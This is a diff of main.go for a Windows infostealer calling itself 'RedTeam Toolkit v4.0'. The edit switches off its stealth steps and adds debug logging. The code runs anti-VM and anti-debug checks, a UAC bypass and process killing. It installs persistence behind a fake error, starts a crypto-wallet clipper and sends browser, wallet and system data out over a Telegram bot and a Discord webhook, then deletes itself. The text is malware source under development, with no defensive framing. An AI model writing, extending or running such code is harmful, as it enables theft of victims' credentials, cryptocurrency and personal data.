@@ -1,5 +1,5 @@
 // ============================================================
-// main.go - RedTeam Toolkit v4.0 (Windows) - COMPLETE
+// main.go - RedTeam Toolkit v4.0 (Windows) - SKIP STEALTH
 // ============================================================
 package main
 
@@ -25,9 +25,6 @@ import (
 	"github.com/RU7HL355/redtm/internal/core/system"
 	"github.com/RU7HL355/redtm/internal/core/vpn"
 	"github.com/RU7HL355/redtm/internal/fakerr"
-	factoryreset "github.com/RU7HL355/redtm/internal/fr"
-	hideconsole "github.com/RU7HL355/redtm/internal/hc"
-	"github.com/RU7HL355/redtm/internal/taskmanager"
 	"github.com/RU7HL355/redtm/internal/uac"
 	"github.com/RU7HL355/redtm/pkg/utils/common"
 	"github.com/RU7HL355/redtm/pkg/utils/processkill"
@@ -47,112 +44,158 @@ type Config struct {
 
 var config Config
 var startTime time.Time
+var debugLog *os.File
 
 func main() {
 	startTime = time.Now()
 	
-	// Initialize logging
+	// Create debug log file
+	debugLog, _ = os.Create("debug.log")
+	defer debugLog.Close()
+	
+	writeDebug("🚀 RedTeam Toolkit v4.0 (Windows) starting...")
+	
 	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
 	log.Println("🚀 RedTeam Toolkit v4.0 (Windows) starting...")
 	log.Println("========================================")
 	
 	// Load configuration
+	writeDebug("Loading config...")
 	if !loadConfig() {
 		log.Println("⚠️ No config found, using defaults")
 		config = getDefaultConfig()
 	} else {
 		log.Println("✅ Config loaded successfully")
 	}
+	writeDebug("Config loaded")
 
-	// Initialize exfil module FIRST
+	// Initialize exfil module
+	writeDebug("Initializing exfil module...")
 	log.Println("📤 Initializing exfil module...")
 	exfil.Init(config.BotToken, config.ChatID, config.Discord)
+	writeDebug("Exfil module initialized")
 
 	// Send startup messages
-	log.Println("📤 Sending startup notifications...")
-	
-	// Test Telegram
+	writeDebug("Sending Telegram test message...")
 	log.Println("📤 Sending Telegram test message...")
 	if exfil.SendTelegram("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
 		log.Println("✅ Telegram test message sent successfully!")
+		writeDebug("Telegram test message sent successfully")
 	} else {
-		log.Println("❌ Telegram test message failed! Check your bot token and chat ID.")
-		if len(config.BotToken) > 10 {
-			log.Printf("   Token: %s...", config.BotToken[:10])
-		} else {
-			log.Printf("   Token: %s", config.BotToken)
-		}
-		log.Printf("   Chat ID: %s", config.ChatID)
+		log.Println("❌ Telegram test message failed!")
+		writeDebug("Telegram test message failed")
 	}
 
-	// Test Discord
+	writeDebug("Sending Discord test message...")
 	log.Println("📤 Sending Discord test message...")
 	if exfil.SendDiscord("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
 		log.Println("✅ Discord test message sent successfully!")
+		writeDebug("Discord test message sent successfully")
 	} else {
 		log.Println("❌ Discord test message failed!")
-		if len(config.Discord) > 30 {
-			log.Printf("   Webhook: %s...", config.Discord[:30])
-		} else {
-			log.Printf("   Webhook: %s", config.Discord)
-		}
+		writeDebug("Discord test message failed")
 	}
 
 	// Send system info
+	writeDebug("Sending system info...")
 	sendSystemInfo()
 
-	// Check if already running
+	// ============================================================
+	// DEBUG: Force send a test message after 5 seconds
+	// ============================================================
+	writeDebug("Waiting 5 seconds...")
+	log.Println("⏳ Waiting 5 seconds for test message...")
+	time.Sleep(5 * time.Second)
+	writeDebug("Sending debug message after 5 seconds...")
+	exfil.SendTelegram("🔍 DEBUG: Test message after 5 seconds")
+
+	// ============================================================
+	// CHECK IF ALREADY RUNNING
+	// ============================================================
+	writeDebug("Checking if already running...")
 	if common.IsAlreadyRunning() {
 		log.Println("⚠️ Already running, exiting...")
+		writeDebug("Already running, exiting")
 		return
 	}
+	writeDebug("Not already running")
 
-	// Anti-analysis checks
+	// ============================================================
+	// ANTI-ANALYSIS CHECKS
+	// ============================================================
+	writeDebug("Running anti-analysis checks...")
 	log.Println("🔍 Running anti-analysis checks...")
 
 	if antivm.IsVM() {
 		log.Println("⚠️ VM detected - exiting")
+		writeDebug("VM detected - exiting")
 		exfil.SendHeartbeat("⚠️ VM detected - exiting")
 		return
 	}
+	writeDebug("VM check passed")
 
 	if antidebug.IsDebugged() {
 		log.Println("⚠️ Debugger detected - exiting")
+		writeDebug("Debugger detected - exiting")
 		exfil.SendHeartbeat("⚠️ Debugger detected - exiting")
 		return
 	}
+	writeDebug("Debugger check passed")
 	
 	log.Println("✅ Anti-analysis checks passed")
+	exfil.SendDebug("Anti-analysis passed")
 
-	// Privilege escalation
+	// ============================================================
+	// PRIVILEGE ESCALATION
+	// ============================================================
+	writeDebug("Attempting UAC bypass...")
 	log.Println("🔐 Attempting UAC bypass...")
 	uac.Run()
+	writeDebug("UAC bypass attempted")
 
-	// Kill competitor processes
+	// ============================================================
+	// KILL COMPETITOR PROCESSES
+	// ============================================================
+	writeDebug("Killing competitor processes...")
 	log.Println("💀 Killing competitor processes...")
 	processkill.Run()
+	writeDebug("Process kill attempted")
 
-	// Stealth operations
-	log.Println("🕵️ Applying stealth...")
-	hideconsole.HideConsole()
-	common.HideSelf()
-	factoryreset.Disable()
-	taskmanager.Disable()
+	// ============================================================
+	// STEALTH OPERATIONS - SKIPPED FOR DEBUGGING
+	// ============================================================
+	writeDebug("Skipping stealth operations for debugging...")
+	log.Println("🕵️ Skipping stealth operations (debug mode)")
+	writeDebug("Stealth skipped")
+	exfil.SendDebug("Stealth skipped (debug mode)")
 
-	// Persistence
+	// ============================================================
+	// PERSISTENCE
+	// ============================================================
+	writeDebug("Checking persistence...")
 	if !common.IsInStartupPath() {
 		log.Println("💾 Installing persistence...")
+		writeDebug("Installing persistence...")
 		go fakerr.Show()
 		go startup.Run()
 	}
+	writeDebug("Persistence check done")
 
-	// Anti-analysis background tasks
+	// ============================================================
+	// ANTI-ANALYSIS BACKGROUND TASKS
+	// ============================================================
+	writeDebug("Starting anti-analysis background tasks...")
 	log.Println("🔒 Starting anti-analysis background tasks...")
 	go antidebug.Run()
 	go antivirus.Run()
+	writeDebug("Anti-analysis background tasks started")
 
-	// Start surveillance
+	// ============================================================
+	// START SURVEILLANCE MODULES
+	// ============================================================
+	writeDebug("Starting surveillance modules...")
 	log.Println("📹 Starting surveillance modules...")
+	exfil.SendDebug("Starting extraction modules")
 
 	// Define all extraction actions
 	actions := []struct {
@@ -170,65 +213,117 @@ func main() {
 	}
 
 	// Run all actions in parallel
+	writeDebug("Starting extraction modules...")
 	log.Println("📂 Starting extraction modules...")
 	for _, action := range actions {
 		log.Printf("📂 Starting: %s", action.name)
+		writeDebug("Started: " + action.name)
 		go action.fn()
 	}
+	writeDebug("All extraction modules started")
 
-	// Start clipper in background
+	// ============================================================
+	// START CLIPPER
+	// ============================================================
+	writeDebug("Starting crypto clipper...")
 	log.Println("💰 Starting crypto clipper...")
 	go clipper.Run(config.Cryptos)
+	writeDebug("Clipper started")
 
-	// Wait for modules to complete with progress updates
-	log.Println("⏳ Waiting for modules to complete (60 seconds)...")
-	exfil.SendHeartbeat("⏳ Starting data extraction...")
+	// ============================================================
+	// WAIT FOR EXTRACTION
+	// ============================================================
+	writeDebug("Waiting 60 seconds for extraction...")
+	log.Println("⏳ Waiting 60 seconds for extraction...")
+	exfil.SendDebug("Extraction started, waiting 60 seconds...")
 
 	// Progress updates every 10 seconds
-	for i := 0; i < 6; i++ {
+	for i := 1; i <= 6; i++ {
+		writeDebug(fmt.Sprintf("Sleeping 10 seconds (%d/6)", i))
 		time.Sleep(10 * time.Second)
 		elapsed := int(time.Since(startTime).Seconds())
-		exfil.SendHeartbeat(fmt.Sprintf("⏳ Extraction in progress... %d seconds elapsed", elapsed))
+		log.Printf("⏳ Progress: %d seconds elapsed", elapsed)
+		writeDebug(fmt.Sprintf("Progress: %d seconds elapsed", elapsed))
+		exfil.SendDebug(fmt.Sprintf("%d seconds elapsed", elapsed))
 	}
+	writeDebug("Wait complete")
+
+	// ============================================================
+	// EXFILTRATE DATA
+	// ============================================================
+	writeDebug("Starting exfiltration...")
+	log.Println("📤 Starting exfiltration...")
+	exfil.SendDebug("Starting exfiltration...")
+
+	// Create test file to ensure something is sent
+	writeDebug("Creating test file...")
+	createTestFile()
+	writeDebug("Test file created")
 
 	// Collect and exfil all data
-	log.Println("📤 Exfiltrating data...")
+	writeDebug("Collecting and sending exfil data...")
+	log.Println("📤 Collecting and sending exfil data...")
 	exfil.SendHeartbeat("📤 Collecting and exfiltrating data...")
 	exfil.CollectAndSend()
+	writeDebug("CollectAndSend complete")
 
 	// Send browser data specifically
+	writeDebug("Sending browser data...")
 	log.Println("📤 Sending browser data...")
 	exfil.SendBrowserData()
+	writeDebug("SendBrowserData complete")
 
 	// Send wallet data
+	writeDebug("Sending wallet data...")
 	log.Println("📤 Sending wallet data...")
 	exfil.SendWalletData()
+	writeDebug("SendWalletData complete")
 
 	// Send system info
+	writeDebug("Sending system info...")
 	log.Println("📤 Sending system info...")
 	exfil.SendSystemInfo()
+	writeDebug("SendSystemInfo complete")
+
+	// ============================================================
+	// FINAL MESSAGES
+	// ============================================================
+	writeDebug("All tasks complete - sending final debug")
+	exfil.SendDebug("All tasks complete")
 
 	// Cleanup
 	if config.SelfDestruct {
+		writeDebug("Self-destruct initiated...")
 		log.Println("💀 Self-destruct initiated...")
 		exfil.SendHeartbeat("💀 Self-destruct initiated")
 		time.Sleep(2 * time.Second)
 		selfDestruct()
+		writeDebug("Self-destruct complete")
 	}
 
 	// Final heartbeat
+	writeDebug("Sending final heartbeat")
 	exfil.SendHeartbeat("✅ All tasks complete")
 	
 	// Print summary
+	writeDebug("Printing summary")
 	printSummary()
 
 	log.Println("✅ All tasks complete!")
+	writeDebug("All tasks complete!")
 
 	// Wait for exit
 	time.Sleep(5 * time.Second)
 }
 
-// loadConfig loads configuration from config.json
+func writeDebug(msg string) {
+	if debugLog != nil {
+		timestamp := time.Now().Format("2006-01-02 15:04:05.000")
+		debugLog.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, msg))
+		debugLog.Sync()
+	}
+}
+
 func loadConfig() bool {
 	data, err := ioutil.ReadFile("config.json")
 	if err != nil {
@@ -244,7 +339,6 @@ func loadConfig() bool {
 	return true
 }
 
-// getDefaultConfig returns default configuration
 func getDefaultConfig() Config {
 	return Config{
 		BotToken: "",
@@ -269,7 +363,6 @@ func getDefaultConfig() Config {
 	}
 }
 
-// sendSystemInfo sends system information
 func sendSystemInfo() {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USERNAME")
@@ -287,7 +380,44 @@ func sendSystemInfo() {
 	exfil.SendHeartbeat(info)
 }
 
-// printSummary prints a summary of the run
+func createTestFile() {
+	testData := map[string]interface{}{
+		"test":      "This is a test file from RedTeam Toolkit",
+		"timestamp": time.Now().Format("2006-01-02 15:04:05"),
+		"hostname":  getHostname(),
+		"username":  getUsername(),
+	}
+	
+	testJSON, err := json.MarshalIndent(testData, "", "  ")
+	if err != nil {
+		log.Printf("❌ Failed to create test JSON: %v", err)
+		return
+	}
+	
+	if err := ioutil.WriteFile("test.json", testJSON, 0644); err != nil {
+		log.Printf("❌ Failed to write test.json: %v", err)
+		return
+	}
+	
+	log.Println("📁 Created test.json for debugging")
+	exfil.SendDebug("📁 Created test.json")
+}
+
+func getHostname() string {
+	name, err := os.Hostname()
+	if err != nil {
+		return "unknown"
+	}
+	return name
+}
+
+func getUsername() string {
+	if os.Getenv("USERNAME") != "" {
+		return os.Getenv("USERNAME")
+	}
+	return os.Getenv("USER")
+}
+
 func printSummary() {
 	elapsed := int(time.Since(startTime).Seconds())
 	
@@ -301,7 +431,6 @@ func printSummary() {
 	log.Println("========================================")
 }
 
-// getConfigStatus returns the config status
 func getConfigStatus() string {
 	if config.BotToken != "" && config.ChatID != "" {
 		return "✅ Configured"
@@ -309,7 +438,6 @@ func getConfigStatus() string {
 	return "❌ Not Configured"
 }
 
-// getTelegramStatus returns the Telegram status
 func getTelegramStatus() string {
 	if config.BotToken != "" {
 		return "✅ Enabled"
@@ -317,7 +445,6 @@ func getTelegramStatus() string {
 	return "❌ Disabled"
 }
 
-// getDiscordStatus returns the Discord status
 func getDiscordStatus() string {
 	if config.Discord != "" {
 		return "✅ Enabled"
@@ -325,31 +452,21 @@ func getDiscordStatus() string {
 	return "❌ Disabled"
 }
 
-// selfDestruct removes all traces
 func selfDestruct() {
 	log.Println("🧹 Cleaning up...")
-
-	// Delete log files
 	os.Remove("redteam.log")
 	os.Remove("telemetry.log")
-
-	// Delete JSON data files
-	files := []string{
-		"browser_data.json",
-		"system_info.json",
-		"wallets.json",
-		"games.json",
-		"socials.json",
-		"common_files.json",
-		"ftps.json",
-		"vpns.json",
-	}
+	os.Remove("debug.log")
 	
+	files := []string{
+		"browser_data.json", "system_info.json", "wallets.json",
+		"games.json", "socials.json", "common_files.json",
+		"ftps.json", "vpns.json", "test.json",
+	}
 	for _, file := range files {
 		os.Remove(file)
 	}
-
-	// Delete executable (Windows)
+	
 	if common.IsWindows() {
 		cmd := "timeout /t 2 /nobreak > nul & del " + os.Args[0]
 		os.StartProcess("cmd", []string{"/c", cmd}, nil)
